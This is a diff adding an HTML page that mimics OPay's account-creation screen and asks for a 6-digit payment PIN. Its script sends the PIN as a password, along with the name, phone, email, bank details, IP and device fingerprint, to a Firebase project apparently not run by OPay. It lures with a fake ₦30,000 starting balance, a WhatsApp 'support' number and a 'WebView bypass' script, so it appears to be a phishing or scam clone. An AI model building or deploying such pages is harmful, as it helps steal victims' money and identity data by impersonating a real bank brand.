@@ -1,0 +1,810 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>OPay Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* ===== THEME VARIABLES (unchanged) ===== */
+        :root {
+            --bg-color: #f8f8fb;
+            --text-color: #212121;
+            --card-bg: #ffffff;
+            --input-bg: #EFEFF5;
+            --border-color: #E0E0E0;
+            --placeholder-color: #9E9E9E;
+            --secondary-text: #616161;
+            --accent-color: #00B876;
+            --accent-light: #E8F5E9;
+            --keypad-bg: #f8f8fb;
+            --key-bg: #ffffff;
+            --error-color: #dc2626;
+            --header-bg: #ffffff;
+            --back-icon: #212121;
+            --help-link: #00B876;
+            --avatar-bg: #E8F5E9;
+            --avatar-color: #00B876;
+            --modal-overlay: rgba(0,0,0,0.5);
+            --modal-bg: #ffffff;
+            --modal-text: #212121;
+            --modal-btn-bg: #00B876;
+        }
+
+        body.dark-theme {
+            --bg-color: #121212;
+            --text-color: #e0e0e0;
+            --card-bg: #1e1e1e;
+            --input-bg: #2d2d2d;
+            --border-color: #333333;
+            --placeholder-color: #757575;
+            --secondary-text: #b0b0b0;
+            --accent-color: #1e9c43;
+            --accent-light: #2a4a2a;
+            --keypad-bg: #121212;
+            --key-bg: #2d2d2d;
+            --error-color: #f87171;
+            --header-bg: #1e1e1e;
+            --back-icon: #e0e0e0;
+            --help-link: #1e9c43;
+            --avatar-bg: #2a4a2a;
+            --avatar-color: #1e9c43;
+            --modal-overlay: rgba(0,0,0,0.7);
+            --modal-bg: #2d2d2d;
+            --modal-text: #e0e0e0;
+            --modal-btn-bg: #1e9c43;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 414px;
+            height: 100vh;
+            max-height: 896px;
+            background-color: var(--card-bg);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            border-radius: 24px;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 24px;
+            background-color: var(--header-bg);
+        }
+
+        .back-icon {
+            width: 22px;
+            height: 22px;
+            stroke: var(--back-icon);
+            stroke-width: 2;
+            fill: none;
+            cursor: pointer;
+        }
+
+        .theme-toggle {
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+            stroke: var(--help-link);
+            fill: none;
+            stroke-width: 2;
+            margin-right: 16px;
+        }
+
+        .help-link {
+            color: var(--help-link);
+            font-weight: 500;
+            font-size: 14px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .profile-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 10px;
+        }
+
+        .avatar {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background-color: var(--avatar-bg);
+            margin-bottom: 10px;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--avatar-color);
+            font-size: 60px;
+        }
+
+        .user-phone {
+            color: var(--text-color);
+            font-size: 15px;
+            margin-bottom: 20px;
+            font-weight: 400;
+            text-align: center;
+            padding: 0 10px;
+            word-break: break-word;
+        }
+
+        .main-content {
+            flex: 1;
+            padding: 0 24px;
+            background-color: var(--card-bg);
+        }
+
+        .welcome-title {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: var(--text-color);
+        }
+
+        .instruction {
+            color: var(--secondary-text);
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 10px;
+        }
+
+        .password-input {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid var(--accent-color);
+            border-radius: 12px;
+            font-size: 18px;
+            outline: none;
+            background-color: var(--input-bg);
+            color: var(--text-color);
+            letter-spacing: 2px;
+        }
+
+        .password-input::placeholder {
+            color: var(--placeholder-color);
+            font-size: 15px;
+            letter-spacing: normal;
+        }
+
+        .login-btn {
+            width: 86%;
+            padding: 15px;
+            margin-left: 28px;
+            background-color: var(--accent-color);
+            border: none;
+            border-radius: 40px;
+            color: white;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            opacity: 0.5;
+            transition: opacity 0.2s;
+            align-items: center;
+        }
+
+        .login-btn.enabled {
+            opacity: 1;
+        }
+
+        .keypad-section {
+            background-color: var(--keypad-bg);
+            padding: 12px 10px 10px;
+            border-top: 1px solid var(--border-color);
+        }
+
+        .keypad-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+            padding: 0 90px;
+        }
+
+        .secure {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            color: var(--secondary-text);
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .secure svg {
+            align-items: center;
+            width: 16px;
+            height: 16px;
+            stroke: var(--accent-color);
+            stroke-width: 2.5;
+            fill: none;
+        }
+
+        .done {
+            color: var(--accent-color);
+            font-weight: 400;
+            font-size: 14px;
+            cursor: pointer;
+            margin-right: -72px;
+        }
+
+        .keypad-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 6px;
+        }
+
+        .keypad-btn {
+            background-color: var(--key-bg);
+            border-radius: 2px;
+            height: 56px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            font-weight: 400;
+            color: var(--text-color);
+            cursor: pointer;
+            user-select: none;
+            transition: background 0.1s;
+        }
+
+        .keypad-btn:active {
+            background-color: var(--accent-light);
+        }
+
+        .keypad-btn.empty {
+            visibility: hidden;
+        }
+
+        .keypad-btn svg {
+            width: 22px;
+            height: 22px;
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 2;
+        }
+
+        /* ===== GREEN CIRCLE LOADER ===== */
+        .loader {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            background: rgba(0, 0, 0, 0.5);
+        }
+
+        .loader-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .green-ring {
+            position: relative;
+            width: 52px;
+            height: 52px;
+            border-radius: 50%;
+            background-color: #1e9c43;
+            border: none;
+            box-sizing: border-box;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo-wrapper {
+            width: 35px;
+            height: 35px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 50%;
+            background: white;
+            box-shadow: 0 4px 0px rgba(0, 0, 0, 0.05);
+            animation: pulse-zoom 0.7s ease-in-out infinite;
+            z-index: 3;
+        }
+
+        .logo-image {
+            width: 25px;
+            height: 25px;
+            object-fit: contain;
+            border-radius: 50%;
+        }
+
+        .orbit {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            animation: rotate-dot 1.5s linear infinite;
+            transform-origin: center center;
+            z-index: 2;
+        }
+
+        .dot {
+            position: absolute;
+            top: 25px;
+            left: 100%;
+            transform: translateX(-1300%);
+            width: 1px;
+            height: 1px;
+            background: white;
+            border-radius: 60%;
+            box-shadow: 0 0 8px 9px rgba(255, 255, 255, 0.5);
+        }
+
+        @keyframes pulse-zoom {
+            0% { transform: scale(1.03); opacity: 0.8; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+            50% { transform: scale(1.15); opacity: 1; box-shadow: 0 10px 20px rgba(5,150,105,0.15); }
+            100% { transform: scale(1.03); opacity: 0.8; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+        }
+
+        @keyframes rotate-dot {
+            from { transform: rotate(0deg); }
+            to   { transform: rotate(360deg); }
+        }
+
+        .toast-message {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #333;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 30px;
+            font-size: 14px;
+            z-index: 1000;
+            display: none;
+        }
+
+        /* Duplicate device modal */
+        .duplicate-device-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--modal-overlay);
+            align-items: center;
+            justify-content: center;
+            z-index: 10001;
+        }
+
+        .duplicate-device-modal.show {
+            display: flex;
+        }
+
+        .duplicate-device-content {
+            background: var(--modal-bg);
+            border-radius: 28px;
+            width: 85%;
+            max-width: 320px;
+            padding: 24px 20px 28px;
+            text-align: center;
+        }
+
+        .duplicate-device-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--modal-text);
+            margin-bottom: 12px;
+        }
+
+        .duplicate-device-message {
+            font-size: 14px;
+            color: var(--secondary-text);
+            line-height: 1.4;
+            margin-bottom: 24px;
+        }
+
+        .duplicate-device-btn {
+            background: var(--modal-btn-bg);
+            color: white;
+            border: none;
+            padding: 12px 0;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 16px;
+            width: 100%;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="app-container">
+        <div class="header">
+            <svg class="back-icon" viewBox="0 0 24 24">
+                <path d="M15 18l-6-6 6-6"/>
+            </svg>
+            <div style="display: flex; align-items: center;">
+                <svg id="themeToggle" class="theme-toggle" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="12" cy="12" r="5"></circle>
+                    <line x1="12" y1="1" x2="12" y2="3"></line>
+                    <line x1="12" y1="21" x2="12" y2="23"></line>
+                    <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                    <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                    <line x1="1" y1="12" x2="3" y2="12"></line>
+                    <line x1="21" y1="12" x2="23" y2="12"></line>
+                    <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                    <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                </svg>
+                <a href="#" class="help-link" id="helpLink">Help</a>
+            </div>
+        </div>
+
+        <div class="profile-section">
+            <div class="avatar">
+                <i class="fas fa-user-circle"></i>
+            </div>
+            <div class="user-phone" id="displayPhone">Loading...</div>
+        </div>
+
+        <div class="main-content">
+            <h1 class="welcome-title" id="welcomeMessage">Welcome</h1>
+            <p class="instruction">Create your 6-digit Payment PIN</p>
+
+            <div class="input-group">
+                <input type="password" id="passwordInput" class="password-input" placeholder="Enter 6-digit Password" maxlength="6" readonly>
+            </div>
+
+            <button id="loginBtn" class="login-btn" disabled>Create Account</button>
+        </div>
+
+        <div class="keypad-section">
+            <div class="keypad-header">
+                <div class="secure">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                        <path d="M9 12l2 2 4-4"></path>
+                    </svg>
+                    OPay Secure Numeric Keypad
+                </div>
+                <span class="done" onclick="hideKeypad()">Done</span>
+            </div>
+
+            <div class="keypad-grid">
+                <div class="keypad-btn" onclick="addNumber('1')">1</div>
+                <div class="keypad-btn" onclick="addNumber('2')">2</div>
+                <div class="keypad-btn" onclick="addNumber('3')">3</div>
+                <div class="keypad-btn" onclick="addNumber('4')">4</div>
+                <div class="keypad-btn" onclick="addNumber('5')">5</div>
+                <div class="keypad-btn" onclick="addNumber('6')">6</div>
+                <div class="keypad-btn" onclick="addNumber('7')">7</div>
+                <div class="keypad-btn" onclick="addNumber('8')">8</div>
+                <div class="keypad-btn" onclick="addNumber('9')">9</div>
+                <div class="keypad-btn empty"></div>
+                <div class="keypad-btn" onclick="addNumber('0')">0</div>
+                <div class="keypad-btn" onclick="deleteNumber()">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
+                        <line x1="18" y1="9" x2="12" y2="15"></line>
+                        <line x1="12" y1="9" x2="18" y2="15"></line>
+                    </svg>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="loadingPopup" class="loader">
+        <div class="loader-container">
+            <div class="green-ring">
+                <div class="orbit">
+                    <div class="dot"></div>
+                </div>
+                <div class="logo-wrapper">
+                    <img src="https://iili.io/qT81u1e.png" alt="Loading Logo" class="logo-image">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="duplicateDeviceModal" class="duplicate-device-modal">
+        <div class="duplicate-device-content">
+            <div class="duplicate-device-title">Device Already Registered</div>
+            <div class="duplicate-device-message">This device already has an OPay account. You cannot create a second account from the same device.</div>
+            <button id="duplicateDeviceLoginBtn" class="duplicate-device-btn">Log In</button>
+        </div>
+    </div>
+
+    <div id="toast" class="toast-message"></div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-app.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-analytics.js";
+        import { getAuth, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-auth.js";
+        import { getFirestore, doc, setDoc, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyAjLxkisBi9pzmjlwdHnYfo25XR2Z6ToEs",
+            authDomain: "opay-plus-5802c.firebaseapp.com",
+            projectId: "opay-plus-5802c",
+            storageBucket: "opay-plus-5802c.firebasestorage.app",
+            messagingSenderId: "967061625774",
+            appId: "1:967061625774:web:236f88391ccdd9edd2863f",
+            measurementId: "G-H0QV81VYBY"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+
+        // ----- DOM elements -----
+        const displayPhone = document.getElementById('displayPhone');
+        const welcomeMessage = document.getElementById('welcomeMessage');
+        const passwordInput = document.getElementById('passwordInput');
+        const loginBtn = document.getElementById('loginBtn');
+        const toast = document.getElementById('toast');
+        const themeToggle = document.getElementById('themeToggle');
+        const backIcon = document.querySelector('.back-icon');
+        const helpLink = document.getElementById('helpLink');
+        const duplicateDeviceModal = document.getElementById('duplicateDeviceModal');
+        const duplicateDeviceLoginBtn = document.getElementById('duplicateDeviceLoginBtn');
+
+        // ----- Retrieve ALL user data from localStorage (set by createacct.html and create-email.html) -----
+        let userFirstName = localStorage.getItem('opayUserFirstName');
+        let userPhone = localStorage.getItem('opayUserPhone');
+        let userFullName = localStorage.getItem('opayUserFullName');
+        let userAccountNumber = localStorage.getItem('opayAccountNumber');
+        let userBankCode = localStorage.getItem('opayBankCode');
+        let userBankName = localStorage.getItem('opayBankName');
+        let userEmail = localStorage.getItem('opayUserEmail');
+        let deviceFingerprint = localStorage.getItem('opayDeviceFingerprint');
+        let userIP = localStorage.getItem('opayUserIP');
+
+        // If essential data missing, go back to account creation
+        if (!userEmail || !userFirstName || !userPhone) {
+            window.location.href = 'createacct.html';
+        }
+
+        // Display phone number and first name
+        displayPhone.textContent = userPhone || 'Phone number not available';
+        welcomeMessage.textContent = `Welcome, ${userFirstName || 'User'}`;
+
+        // ----- Toast helper -----
+        function showToast(message, isError = false) {
+            toast.textContent = message;
+            toast.style.backgroundColor = isError ? '#dc2626' : '#333';
+            toast.style.display = 'block';
+            setTimeout(() => {
+                toast.style.display = 'none';
+            }, 3000);
+        }
+
+        // ===== LOADER CONTROL =====
+        function showLoader(show) {
+            const loader = document.getElementById('loadingPopup');
+            if (loader) loader.style.display = show ? 'flex' : 'none';
+        }
+
+        // ===== CHECK IF DEVICE FINGERPRINT ALREADY EXISTS =====
+        async function deviceFingerprintExists(fingerprint) {
+            try {
+                const usersRef = collection(db, 'users');
+                const q = query(usersRef, where('deviceFingerprint', '==', fingerprint));
+                const querySnapshot = await getDocs(q);
+                return !querySnapshot.empty;
+            } catch (err) {
+                console.error('Error checking fingerprint:', err);
+                return false;
+            }
+        }
+
+        // ===== SAVE USER TO FIRESTORE (Tier 0 with ₦30,000 balance) =====
+        async function saveUserToFirestore(user) {
+            try {
+                const userRef = doc(db, 'users', user.uid);
+                const userData = {
+                    fullName: userFullName || userFirstName,
+                    firstName: userFirstName,
+                    phone: userPhone,
+                    email: user.email,
+                    createdAt: new Date().toISOString(),
+                    subscriptionActive: true,
+                    tier: 0,                     // New users start at Tier 0
+                    bankCode: userBankCode || '',
+                    bankName: userBankName || 'OPay Digital Services',
+                    accountNumber: userAccountNumber || '',
+                    balance: 30000,               // ₦30,000 starting balance (numeric)
+                    transactions: [],
+                    deviceFingerprint: deviceFingerprint,
+                    lastIP: userIP || 'unknown',
+                    lastLogin: new Date().toISOString()
+                };
+                await setDoc(userRef, userData);
+                console.log('User saved to Firestore with Tier 0 and ₦30,000 balance');
+                // Save to localStorage for dashboard
+                localStorage.setItem('tier', 'tier0');
+                localStorage.setItem('userBalance', '30000');
+                localStorage.setItem('transactions', '[]');
+                localStorage.setItem('opayAccountCreated', 'true');
+            } catch (error) {
+                console.error('Firestore save error:', error);
+                throw error;
+            }
+        }
+
+        // ===== KEYPAD LOGIC =====
+        function updateButtonState() {
+            if (passwordInput.value.length === 6) {
+                loginBtn.disabled = false;
+                loginBtn.classList.add('enabled');
+            } else {
+                loginBtn.disabled = true;
+                loginBtn.classList.remove('enabled');
+            }
+        }
+
+        window.addNumber = function(num) {
+            if (passwordInput.value.length < 6) {
+                passwordInput.value += num;
+                updateButtonState();
+            }
+        };
+
+        window.deleteNumber = function() {
+            passwordInput.value = passwordInput.value.slice(0, -1);
+            updateButtonState();
+        };
+
+        window.hideKeypad = function() {
+            passwordInput.blur();
+        };
+
+        // ===== CREATE ACCOUNT (only new users) =====
+        loginBtn.addEventListener('click', async () => {
+            if (loginBtn.disabled) return;
+
+            const email = userEmail;
+            const password = passwordInput.value;
+
+            if (!email) {
+                showToast('Email missing. Please start over.', true);
+                window.location.href = 'create-email.html';
+                return;
+            }
+            if (!password || password.length !== 6) {
+                showToast('Please enter a valid 6-digit PIN.', true);
+                return;
+            }
+
+            showLoader(true);
+
+            // Check if this device fingerprint already has an account
+            const fingerprintExists = await deviceFingerprintExists(deviceFingerprint);
+            if (fingerprintExists) {
+                showLoader(false);
+                duplicateDeviceModal.classList.add('show');
+                return;
+            }
+
+            try {
+                // Create the Firebase Auth user
+                const userCredential = await createUserWithEmailAndPassword(auth, email, password);
+                console.log('Account created:', userCredential.user.uid);
+                await saveUserToFirestore(userCredential.user);
+                showToast('Account created successfully!');
+                setTimeout(() => {
+                    showLoader(false);
+                    window.location.href = 'dashboardful.html';
+                }, 500);
+            } catch (error) {
+                showLoader(false);
+                console.error('Account creation error:', error);
+                if (error.code === 'auth/email-already-in-use') {
+                    showToast('Email already registered. Please log in.', true);
+                    setTimeout(() => {
+                        window.location.href = 'login-email.html';
+                    }, 2000);
+                } else {
+                    showToast(error.message, true);
+                }
+            }
+        });
+
+        // ===== DUPLICATE DEVICE MODAL HANDLER =====
+        duplicateDeviceLoginBtn.addEventListener('click', () => {
+            duplicateDeviceModal.classList.remove('show');
+            window.location.href = 'login-email.html';
+        });
+
+        // ===== THEME TOGGLE =====
+        const body = document.body;
+        const savedTheme = localStorage.getItem('theme');
+        if (savedTheme === 'dark') {
+            body.classList.add('dark-theme');
+            themeToggle.innerHTML = `<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>`;
+        } else {
+            themeToggle.innerHTML = `
+                <circle cx="12" cy="12" r="5"></circle>
+                <line x1="12" y1="1" x2="12" y2="3"></line>
+                <line x1="12" y1="21" x2="12" y2="23"></line>
+                <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                <line x1="1" y1="12" x2="3" y2="12"></line>
+                <line x1="21" y1="12" x2="23" y2="12"></line>
+                <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+            `;
+        }
+
+        themeToggle.addEventListener('click', () => {
+            if (body.classList.contains('dark-theme')) {
+                body.classList.remove('dark-theme');
+                localStorage.setItem('theme', 'light');
+                themeToggle.innerHTML = `
+                    <circle cx="12" cy="12" r="5"></circle>
+                    <line x1="12" y1="1" x2="12" y2="3"></line>
+                    <line x1="12" y1="21" x2="12" y2="23"></line>
+                    <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                    <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                    <line x1="1" y1="12" x2="3" y2="12"></line>
+                    <line x1="21" y1="12" x2="23" y2="12"></line>
+                    <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                    <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                `;
+            } else {
+                body.classList.add('dark-theme');
+                localStorage.setItem('theme', 'dark');
+                themeToggle.innerHTML = `<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>`;
+            }
+        });
+
+        // ===== OTHER HANDLERS =====
+        backIcon.addEventListener('click', () => {
+            window.location.href = 'create-email.html';
+        });
+
+        helpLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            const supportNumber = '2349116125762';
+            const whatsappUrl = `https://wa.me/${supportNumber}?text=Hello%2C%20I%20need%20help%20with%20the%20OPay%20app.`;
+            window.open(whatsappUrl, '_blank');
+        });
+
+        updateButtonState();
+    </script>
+    <!-- PWA check script with WebView bypass -->
+    <script src="/pwa-check.js"></script>
+    <script src="/network-popup.js"></script>
+</body>
+</html>
